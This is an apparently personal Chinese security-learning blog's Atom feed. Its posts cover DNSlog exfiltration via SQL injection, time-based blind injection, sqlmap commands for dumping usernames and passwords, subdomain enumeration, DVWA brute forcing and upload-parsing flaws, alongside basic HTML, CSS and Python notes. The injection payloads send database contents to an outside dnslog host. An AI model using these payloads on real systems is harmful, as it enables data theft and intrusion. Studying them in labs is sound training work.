<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Breeze</title>
  
  
  <link href="http://wifi-0x.github.io/atom.xml" rel="self"/>
  
  <link href="http://wifi-0x.github.io/"/>
  <updated>2022-09-05T07:46:36.746Z</updated>
  <id>http://wifi-0x.github.io/</id>
  
  <author>
    <name>微风</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DNSlog</title>
    <link href="http://wifi-0x.github.io/2022/07/11/DNSlog/"/>
    <id>http://wifi-0x.github.io/2022/07/11/DNSlog/</id>
    <published>2022-07-11T13:46:42.000Z</published>
    <updated>2022-09-05T07:46:36.746Z</updated>
    
    <content type="html"><![CDATA[<p>首先我们知道DNS是起ip与域名的解析的服务，通过ip可以解析到对应的域名。DNSlog就是储存在DNS上的域名相关的信息，它记录着你对域名或者IP的访问信息，也就是类似于日志文件，</p><h3 id="DNSlog回显原理"><a href="#DNSlog回显原理" class="headerlink" title="DNSlog回显原理"></a>DNSlog回显原理</h3><p>首先了解一下多级域名的概念，我们知道因特网采用树状结构命名方法，按组织结构划分域是一个名字空间中一个被管理的划分，域可划分为子域，子域再可被划分为多级域名称为一级域名，二级域名，三级域名，从一个域名地址来从右到左依次是顶级域名，二级域名，三级域名,例如 gaobai.kxsy.com,<br>通俗的说就是我有个域名kxsy.work，我将域名设置对应的ip 2.2.2.2 上，这样当我向dns服务器发起kxsy.work的解析请求时，DNSlog中会记录下他给kxsy.work解析，解析值为2.2.2.2，而我们这个解析的记录的值就是我们要利用的地方,这个过程被记录下来就是DNSlog</p><h3 id="DNSlog-应用"><a href="#DNSlog-应用" class="headerlink" title="DNSlog 应用"></a>DNSlog 应用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.SQL盲注</span><br><span class="line">2.无回显的XSS</span><br><span class="line">3.无回显的命令执行</span><br><span class="line">5.无回显的SSRF</span><br><span class="line">5.Blind XXE</span><br></pre></td></tr></table></figure><p><strong>SQL盲注</strong>无论时时间盲注还是布尔盲注，都需要发送大量的数据包去判断数据，很容易导致被waf封IP，如果条件允许的话，可以使用dnslog进行快速的数据外带。以Mysql为例，通过dnslog外带数据需要用到load_file函数，所以一般得是root权限，并且secure_file_priv得为空</p><h4 id="免费dns解析记录网站"><a href="#免费dns解析记录网站" class="headerlink" title="免费dns解析记录网站"></a>免费dns解析记录网站</h4><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a><br><a href="http://admin.dnslog.link/">http://admin.dnslog.link</a><br><a href="http://ceye.io/">http://ceye.io</a></p><h3 id="DNSlog注入实例演练"><a href="#DNSlog注入实例演练" class="headerlink" title="DNSlog注入实例演练"></a>DNSlog注入实例演练</h3><p>1.在dnslog网站申请一个dnslog域名：h30qdp.dnslog.cn</p><p><img src="C:\博客\source\pic\dnslog.png" alt="dnslog"></p><p>2.打开sqilab-8</p><p>​    构造语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?id=1%27union%20select%201,2,load_file(concat(%27//%27,(select%20database()),%27.h30qdp.dnslog.cn</span><br></pre></td></tr></table></figure><p>![屏幕截图 2022-09-05 153113](C:\博客\source\pic\屏幕截图 2022-09-05 153113.png)</p><p>执行后获得</p><p>![屏幕截图 2022-09-05 153030](C:\博客\source\pic\屏幕截图 2022-09-05 153030.png)</p><p>修改子查询里的内容，获取其他数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;union select 1,2,load_file(concat(&#x27;//&#x27;,(select username form users limit 0,1),&#x27;.9u77ed.dnslog.cn/abc&#x27;))#</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先我们知道DNS是起ip与域名的解析的服务，通过ip可以解析到对应的域名。DNSlog就是储存在DNS上的域名相关的信息，它记录着你对域名或者IP的访问信息，也就是类似于日志文件，&lt;/p&gt;
&lt;h3 id=&quot;DNSlog回显原理&quot;&gt;&lt;a href=&quot;#DNSlog回显原理&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>子域名爆破</title>
    <link href="http://wifi-0x.github.io/2022/04/16/%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4/"/>
    <id>http://wifi-0x.github.io/2022/04/16/%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4/</id>
    <published>2022-04-16T00:17:35.000Z</published>
    <updated>2022-04-16T00:45:43.191Z</updated>
    
    <content type="html"><![CDATA[<p>域名的形式：</p><p><strong>zkaq.cn    顶级域名(一级)</strong></p><p><strong>a.zkaq.cn 二级域名</strong></p><p><strong>b.a.zkaq.cn  三级域名</strong></p><p>根据点的多少来判断他是几级域名</p><p><strong>二级域名</strong>就是<strong>一级域名的子域名</strong></p><p><strong>三级是二级的子域名</strong></p><p><em>一、通常情况下，一般主站的防御会很严，但是他的子站安全性可能不会那么全面</em></p><p><em>二、同一个域名下的二级域名都属于相同资产，一般而言都有相关的联系，因此可以扩大攻击范围</em></p><h3 id="运用在线的子域名搜索网站"><a href="#运用在线的子域名搜索网站" class="headerlink" title="运用在线的子域名搜索网站"></a>运用在线的子域名搜索网站</h3><p><strong>一、运用搜索引擎（谷歌语法）</strong></p><p>site:qq.com （搜索qq.com下面的所有子域名）</p><p><strong>二、证书搜索</strong></p><p>基于SSL证书查询子域：<a href="https://crt.sh/">https://crt.sh/</a></p><p><strong>三、查询Dns的解析记录</strong></p><p>基于DNS记录查询子域：<a href="https://dns.bufferover.run/dns?q=">https://dns.bufferover.run/dns?q=</a></p><p><strong>四、在线爆破枚举子域</strong>：<a href="http://phpinfo.me/domain/">http://phpinfo.me/domain/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;域名的形式：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;zkaq.cn    顶级域名(一级)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;a.zkaq.cn 二级域名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;b.a.zkaq.cn  三级域名&lt;/strong&gt;&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SQLmap</title>
    <link href="http://wifi-0x.github.io/2022/04/10/SQLmap/"/>
    <id>http://wifi-0x.github.io/2022/04/10/SQLmap/</id>
    <published>2022-04-10T02:44:44.000Z</published>
    <updated>2022-04-10T08:10:02.049Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Sqlmap注入的命令参数"><a href="#Sqlmap注入的命令参数" class="headerlink" title="Sqlmap注入的命令参数"></a>Sqlmap注入的命令参数</h3><p><strong><u>1、判断注入点</u>：</strong>sqlmap -u url（目标地址）<br>    -u：指定地址</p><p><strong><u>2、爆破数据库名</u><strong>：sqlmap -u <a href="http://xxx.com/?id=1">http://xxx.com/?id=1</a> –dbs<br>    <strong>–dbs：查看所有数据库名</strong><br>    <strong>–current-db</strong>：</strong>查看当前使用的数据库</strong></p><p><strong><u>3、爆破数据表名</u>：</strong>sqlmap -u <a href="http://xxx.com/?id=1">http://xxx.com/?id=1</a> –D 库名 –tables<br>    -D：指定数据库名<br>    –tables：查看指定库下面的所有的表名</p><p><u><strong>4、爆破字段名</strong></u><br>   sqlmap. -u <a href="http://xxx.com/?id=1">http://xxx.com/?id=1</a> -D 库名 –T 表名 –columns<br>     -T:指定表名<br>     –columns:查看指定库的表中的所有字段名</p><p><u><strong>5、爆破所有数据</strong></u><br>    sqlmap. -u <a href="http://xxx.com/?id=1">http://xxx.com/?id=1</a> -D 库名 -T 表名 -C 字段名 –dump<br>     -C：指定字段名<br>     –dump：根据指定的库、表、字段爆破里面的数据</p><p>同时查username，password：sqlmap -u  <a href="http://xxx.com/?id=1">http://xxx.com/?id=1</a> -D 库名 -T 表名 -C username,password –dump</p><h4 id="Sqlmap对伪静态进行注入"><a href="#Sqlmap对伪静态进行注入" class="headerlink" title="Sqlmap对伪静态进行注入"></a>Sqlmap对伪静态进行注入</h4><p><strong>使用方式</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap. -u http://xxx.com/abc/1*.html --dbs</span><br><span class="line">    (* 表示指定注入点)</span><br></pre></td></tr></table></figure><h4 id="Sqlmap对登陆框（表单）进行注入"><a href="#Sqlmap对登陆框（表单）进行注入" class="headerlink" title="Sqlmap对登陆框（表单）进行注入"></a>Sqlmap对登陆框（表单）进行注入</h4><p><strong>使用方式</strong>：sqlmap. -u <a href="http://xxx.com/admin/index.php">http://xxx.com/admin/index.php</a> –form</p><p>然后 sqlmap. -u <a href="http://xxx.com/admin/index.php">http://xxx.com/admin/index.php</a> –form –dbs</p><p>然后重复查表查列的过程</p><p>其他命令参数：<br><strong>–batch</strong>：自动选择    （帮你按回车）</p><p><strong>–flush-session</strong>：清除缓存 //简写 –z flu</p><p><strong>–level</strong>:共有五个等级，默认为1，等级越高，测试的内容也越多</p><p><strong>–risk</strong>：共有四个风险等级，默认是1，等级越高，用来测试的语句也更多</p><p><strong>-v</strong>：显示详细扫描信息，共有5个等级（等级越高显示越详细）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Sqlmap注入的命令参数&quot;&gt;&lt;a href=&quot;#Sqlmap注入的命令参数&quot; class=&quot;headerlink&quot; title=&quot;Sqlmap注入的命令参数&quot;&gt;&lt;/a&gt;Sqlmap注入的命令参数&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;u&gt;1、判断注入点&lt;/u&gt;：&lt;/s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>时间盲注</title>
    <link href="http://wifi-0x.github.io/2022/02/25/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
    <id>http://wifi-0x.github.io/2022/02/25/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</id>
    <published>2022-02-25T06:07:36.000Z</published>
    <updated>2022-02-25T14:05:01.347Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#x27; and sleep(5)--+</span><br></pre></td></tr></table></figure><p>发现明显延迟，说明语句构造正确</p><p>接下来的思路是通过延迟，依次爆破数据库长度，数据库名，表名，列名，以及字段</p><p>?id=1’ and if(length(database())=8,sleep(5),1)–+</p><p><img src="https://s2.loli.net/2022/02/25/4vCBm5l736Ysped.png"></p><p>明显延迟，数据库长度为8.</p><p>?id=1’ and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=’r’ ,sleep(5),1)–+</p><p>未完待续。。。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>requests</title>
    <link href="http://wifi-0x.github.io/2022/02/24/requests/"/>
    <id>http://wifi-0x.github.io/2022/02/24/requests/</id>
    <published>2022-02-24T08:31:05.000Z</published>
    <updated>2022-02-24T12:51:26.026Z</updated>
    
    <content type="html"><![CDATA[<p>python的一个库</p><p>写脚本需要用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">w=requests.get(<span class="string">&#x27;https://www.bilibili.com&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(w.status_code) <span class="comment">#打印返回的状态码（200）</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;python的一个库&lt;/p&gt;
&lt;p&gt;写脚本需要用&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>爆破</title>
    <link href="http://wifi-0x.github.io/2022/02/23/%E7%88%86%E7%A0%B4/"/>
    <id>http://wifi-0x.github.io/2022/02/23/%E7%88%86%E7%A0%B4/</id>
    <published>2022-02-23T11:33:35.000Z</published>
    <updated>2022-02-23T11:44:31.677Z</updated>
    
    <content type="html"><![CDATA[<h2 id="暴力破解账号密码"><a href="#暴力破解账号密码" class="headerlink" title="暴力破解账号密码"></a><em>暴力破解账号密码</em></h2><hr><p>安全级别为 Low，点击 Brute Force 按钮，进行暴力破解模块，发现是个用户登录的页面，随意输入用户名和密码，发现提示用户名或密码错误；同时<em><strong>发现输入的用户名和密码携带在了 URL 中，所以确认该页面提交方式为 GET</strong></em></p><p><img src="https://s2.loli.net/2022/02/23/QAHrmxtOFKbTC9M.jpg"></p><p><em><strong>DVWA 存在一个默认账户</strong></em>，用户名和密码为 admin/password，使用该账户登录，发现页面提示 Welcome to the passowrd protected area admin，来说明登录成功。</p><p><img src="https://s2.loli.net/2022/02/23/jyVQu2nKAq5DeNv.jpg"></p><p>构建一个字典文件，包含正确的密码信息 password</p><p>用 Burpsuite 抓包</p><p><img src="https://s2.loli.net/2022/02/23/yDQT4FlOs8XMWkN.jpg"></p><p>点击 Action 按钮，选择 Send to Intruder，把数据包信息发送到暴力破解模块</p><p><img src="https://s2.loli.net/2022/02/23/DTqPVGyWe6dlI7o.jpg"></p><p>点击 Intruder 模块，选择 Positions 标签，可以看到发送过来的数据包信息</p><p><img src="https://s2.loli.net/2022/02/23/sAdb8LmlSzJxoUh.jpg"></p><p>点击 Clear § 按钮清除掉所有变量</p><p>添加变量</p><p><img src="https://s2.loli.net/2022/02/23/CwbZK53tPv8sSGy.jpg"></p><p>切换到 Payloads 标签，在 Payload Option 处，点击 Load 按钮，选择构建好的字典文件</p><p>下拉到 Grep Match 处，点击 Clear，清除掉现有猜解成功匹配字符，然后添加之前我们看到的 DVWA 中登录成功的提示字符 Welcome to the passowrd，然后点击 Add。这样等到猜解成功后，就会自动提示，不用我们自己去比对回包长度和响应状态码来判断哪个是正确的密码</p><p><img src="https://s2.loli.net/2022/02/23/ZeP3uas4mvWGLB2.jpg"></p><p>点击 Start Attack 按钮，开始爆破，可以发现，当猜解到 password 时，回包长度与其他都不一致，而且打钩提示该密码是正确的</p><p><img src="https://s2.loli.net/2022/02/23/Zq2xITSFHu9oAaC.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;暴力破解账号密码&quot;&gt;&lt;a href=&quot;#暴力破解账号密码&quot; class=&quot;headerlink&quot; title=&quot;暴力破解账号密码&quot;&gt;&lt;/a&gt;&lt;em&gt;暴力破解账号密码&lt;/em&gt;&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;安全级别为 Low，点击 Brute Force 按钮，进行暴力</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://wifi-0x.github.io/2022/02/22/0222/"/>
    <id>http://wifi-0x.github.io/2022/02/22/0222/</id>
    <published>2022-02-22T09:47:49.517Z</published>
    <updated>2022-02-22T09:47:49.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="20220222"><a href="#20220222" class="headerlink" title="20220222"></a>20220222</h2><p>在这个特殊的日子，我纪念一下。</p><p>阴天</p><p>冷</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;20220222&quot;&gt;&lt;a href=&quot;#20220222&quot; class=&quot;headerlink&quot; title=&quot;20220222&quot;&gt;&lt;/a&gt;20220222&lt;/h2&gt;&lt;p&gt;在这个特殊的日子，我纪念一下。&lt;/p&gt;
&lt;p&gt;阴天&lt;/p&gt;
&lt;p&gt;冷&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://wifi-0x.github.io/2022/02/13/CSS%E8%AF%AD%E8%A8%80/"/>
    <id>http://wifi-0x.github.io/2022/02/13/CSS%E8%AF%AD%E8%A8%80/</id>
    <published>2022-02-13T09:20:43.070Z</published>
    <updated>2022-02-23T07:20:15.714Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CSS语言"><a href="#CSS语言" class="headerlink" title="CSS语言"></a>CSS语言</h3><hr><p>作用：定义了网站内容的【布局和样式】。<br>    ps：html语言定义的是内容。</p><pre><code>语法：选取式语法。选取标签，然后给选中的标签添加样式和布局。 需要在head里面，加上&lt;style&gt;&lt;/style&gt;标签名选择器 , 表现形式： 标签名 &#123;属性：值&#125;id选择器 ， 表现形式： #id名 &#123;属性：值&#125; ，ps：使用id选择器，必须给标签添加一个id属性。class选择器 ，表现形式： .class名 &#123;属性：值&#125; ，ps：使用class选择器，必须给标签添加一个class属性。属性：z-index ，作用：定义的标签显示的顺序</code></pre><h3 id="Javascript语言"><a href="#Javascript语言" class="headerlink" title="Javascript语言"></a>Javascript语言</h3><hr><p>作用：定义了网站的功能<br>    ps：html语言定义的是【内容】。CSS定义的是内容的【样式和布局】</p><p>语法：变量函数式语法，</p><p>核心：<em><strong>变量存储数据，函数决定功能</strong></em>–》 作用。</p><p>在数学里面设变量  ：设 x = “888888”</p><p>在Javascript语言设变量 ：var x =”888888”<br>    函数： alert() ，作用：弹框</p><p>var x =”888888”  # 变量x存储了888888的数据<br>alert(x);  # 弹框，弹的内容是变量x存储的内容。</p><p>js也可以选取标签的。</p><p>var a = document.getElementById(“id”);<br>        document.getElementById  函数，作用：根据ID选取标签</p><p>document.getElementById(‘vv’).onclick = function () {<br>      alert(‘6666’)   // 这里写功能<br>}<br>        onclick # 给标签定义了一个点击事件，你点它，它就会出现功能</p><h3 id="PHP语言"><a href="#PHP语言" class="headerlink" title="PHP语言"></a>PHP语言</h3><hr><p>作用：【接收】前端传过来的【数据】，进行处理,将处理完的数据【变成前端代码】交给【浏览器执行】<br>    语法：变量函数式语法</p><p>在Javascript语言设变量 ：var x =”888888”<br>在php语言设变量：$x = “888888”<br>    函数：echo ，作用：输出内容。<br>ps：后端语言的解析，需要中间件的配合。</p><p>$a=$_REQUEST[‘username’];<br>echo “<a href='https://www.baidu.com'>“.$a.”</a>“;</p><p>$_REQUEST # 函数，作用：接受【参数的名】</p><p>ps：服务器是根据【参数的名】来接受【参数的值】。 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;CSS语言&quot;&gt;&lt;a href=&quot;#CSS语言&quot; class=&quot;headerlink&quot; title=&quot;CSS语言&quot;&gt;&lt;/a&gt;CSS语言&lt;/h3&gt;&lt;hr&gt;
&lt;p&gt;作用：定义了网站内容的【布局和样式】。&lt;br&gt;    ps：html语言定义的是内容。&lt;/p&gt;
&lt;pre&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://wifi-0x.github.io/2022/02/12/HTML%E8%AF%AD%E8%A8%80%EF%BC%881%EF%BC%89/"/>
    <id>http://wifi-0x.github.io/2022/02/12/HTML%E8%AF%AD%E8%A8%80%EF%BC%881%EF%BC%89/</id>
    <published>2022-02-12T11:23:44.191Z</published>
    <updated>2022-02-13T09:12:21.095Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTML语言（1）"><a href="#HTML语言（1）" class="headerlink" title="HTML语言（1）"></a>HTML语言（1）</h1><p>作用：定义的是【网站显示的内容】。<br>    凡是 你在网站上看到的东西，都属于HTML语言。<br>    语法：标签式语法。 表现形式：&lt;标签名&gt;内容&lt;/标签名&gt;  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span> # title标签，作用：定义网站的标题</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span> # body标签，作用：放一些有关内容显示的标签</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span>  # h1标签，作用：定义文字的标题</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> #a标签，作用：超链接，点击后可以跳转页面。</span><br><span class="line">属性：href， 作用：定义跳转后的网址</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span>  # img标签，作用：加载一张图片。</span><br><span class="line">属性：src，作用：添加进来一张图片。</span><br><span class="line">属性：width，作用：定义图片的宽度。width=&quot;100%&quot;(图片宽度占整个网页，横向不可滑动)</span><br><span class="line">属性：height，作用：定义图片的高度。</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">from</span>&gt;</span> # form标签，作用：表单内的数据，可以提交给其他的服务器进行处理。</span><br><span class="line">属性：method：作用：提交的方式 GET/POST</span><br><span class="line">属性：action，作用：提交的地方</span><br><span class="line">ps：服务器是根据【参数的名】来接受【参数的值】。  百度的参数的名是wd。</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>/&gt;</span># 控件标签，</span><br><span class="line"> 属性：type ，作用：定义控件的类型</span><br><span class="line">属性：name，作用：定义控件的名字，也相当于定义的是参数的名字。</span><br><span class="line">属性：placeholder ，作用：定义默认显示的值。</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span> # br标签，作用：换行。</span><br></pre></td></tr></table></figure><form method="get" action="https://www.baidu.com/s">    <input type="text" name="wd"/>    <input type="submit"/></form>#### 把输入的东西提交到百度进行搜索<p>代码为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;get&quot;</span> action=<span class="string">&quot;https://www.baidu.com/s&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;wd&quot;</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/02/12/3bieLsOKR9kT1Jn.png"></p><p>点击提交</p><p><img src="https://s2.loli.net/2022/02/12/N93kQhS5nFptBf6.png"></p><p>​                                                                <strong>author</strong>: <em>zhang wei feng</em></p><p>​                                                                    来<em>自张炜锋的备忘录</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTML语言（1）&quot;&gt;&lt;a href=&quot;#HTML语言（1）&quot; class=&quot;headerlink&quot; title=&quot;HTML语言（1）&quot;&gt;&lt;/a&gt;HTML语言（1）&lt;/h1&gt;&lt;p&gt;作用：定义的是【网站显示的内容】。&lt;br&gt;    凡是 你在网站上看到的东西，都属于</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://wifi-0x.github.io/2022/02/11/%E4%B8%AD%E9%97%B4%E9%94%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://wifi-0x.github.io/2022/02/11/%E4%B8%AD%E9%97%B4%E9%94%AE%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-02-11T15:10:20.310Z</published>
    <updated>2022-02-11T15:20:22.640Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h2><p><strong>原理</strong>：我们上传的木马等文件被目标服务器执行。<br>        ①.木马一定要上传成功，放到目标服务器里面。<br>        ②.这个木马一定要能够被执行。</p><p>这个靶场，他的中间件是IIS 6.0。<br><strong>存在一个漏洞</strong>：它会将cer、cdx等后缀的文件，当成asp进行解析。</p><p>windows+IIS ：内存溢出漏洞</p><p><strong>中间件</strong>：就是一个提供web服务的软件。就是一个能够让别人看我们网站的软件！<br>        Apache、Nginx</p><h3 id="phpstudy-解析漏洞-："><a href="#phpstudy-解析漏洞-：" class="headerlink" title="phpstudy 解析漏洞 ："></a>phpstudy 解析漏洞 ：</h3><p>只需要你访问这个图片的时候，只需要在后面加上  /.php   ，那么这个服务器就会把这个png当做php进行解析。</p><p>​        IIS 6.0 漏洞：会将cer、cdx等后缀的文件，当成asp进行解析。</p><p>二次渲染：我们上传的文件，上传成功之后，服务器做了一个处理，将之前的图片重新生成了一个。<br>        处理方法：只需要将图片base64编码后，通过burp进行替换就可以绕过了。</p><p>中间件解析漏洞(中间键常见漏洞总结）：<a href="https://www.freebuf.com/articles/web/192063.html">https://www.freebuf.com/articles/web/192063.html</a></p><p>以后知道目标服务器用了啥中间件，就可以依据这个文章进行复现尝试。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;文件解析漏洞&quot;&gt;&lt;a href=&quot;#文件解析漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件解析漏洞&quot;&gt;&lt;/a&gt;文件解析漏洞&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;：我们上传的木马等文件被目标服务器执行。&lt;br&gt;        ①.木</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://wifi-0x.github.io/2022/01/17/Python%20%E7%9A%84%E6%95%B4%E6%95%B0%E6%98%AF%E4%B8%8D%E5%8F%AF%E5%8F%98%E7%B1%BB%E5%9E%8B/"/>
    <id>http://wifi-0x.github.io/2022/01/17/Python%20%E7%9A%84%E6%95%B4%E6%95%B0%E6%98%AF%E4%B8%8D%E5%8F%AF%E5%8F%98%E7%B1%BB%E5%9E%8B/</id>
    <published>2022-01-17T01:22:04.479Z</published>
    <updated>2022-01-17T01:22:04.606Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Python-的整数是不可变类型"><a href="#Python-的整数是不可变类型" class="headerlink" title="Python 的整数是不可变类型"></a><strong>Python 的整数是不可变类型</strong></h3><ul><li>C 之类的语言（写法 <code>int i = 1000</code>）会申请一块内存空间，并给它“绑定”一个固定的名称 i，同时写入一个可变的值 1000。在这里，i 的地址以及类型是固定的，而值是可变的（在一定的表示范围内）</li><li>Python（写法<code>i = 1000</code>）也会申请一块内存空间，但是它会“绑定”给数字 1000，即这个 1000 的地址以及类型是固定的，至于 i，只是一个名称标签贴在 1000 上，自身没有固定的地址和类型</li></ul><p><em>所以当我们令 i “自增”时（i = i + 1），它们的处理是不同的：</em></p><ul><li>C 之类的语言先找到 i 的地址上存的数值，然后令它加 1，操作后新的数值就取代了旧的数值</li><li>Python 的操作过程是把 i 指向的数字加 1，然后把结果绑定到新申请的一块内存空间，再把名称标签 i “贴”到新的数字上。新旧数字可以同时存在，不是取代关系</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Python-的整数是不可变类型&quot;&gt;&lt;a href=&quot;#Python-的整数是不可变类型&quot; class=&quot;headerlink&quot; title=&quot;Python 的整数是不可变类型&quot;&gt;&lt;/a&gt;&lt;strong&gt;Python 的整数是不可变类型&lt;/strong&gt;&lt;/h3&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://wifi-0x.github.io/2021/12/11/%E7%BA%A2%E8%89%B2%E7%88%B1%E5%BF%83%E4%BB%A3%E7%A0%81/"/>
    <id>http://wifi-0x.github.io/2021/12/11/%E7%BA%A2%E8%89%B2%E7%88%B1%E5%BF%83%E4%BB%A3%E7%A0%81/</id>
    <published>2021-12-11T14:49:10.359Z</published>
    <updated>2021-12-11T14:49:10.511Z</updated>
    
    <content type="html"><![CDATA[<h1 id="红色爱心代码"><a href="#红色爱心代码" class="headerlink" title="红色爱心代码"></a>红色爱心代码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">float</span> x, y, a;</span><br><span class="line"><span class="keyword">for</span> (y = <span class="number">1.5</span>; 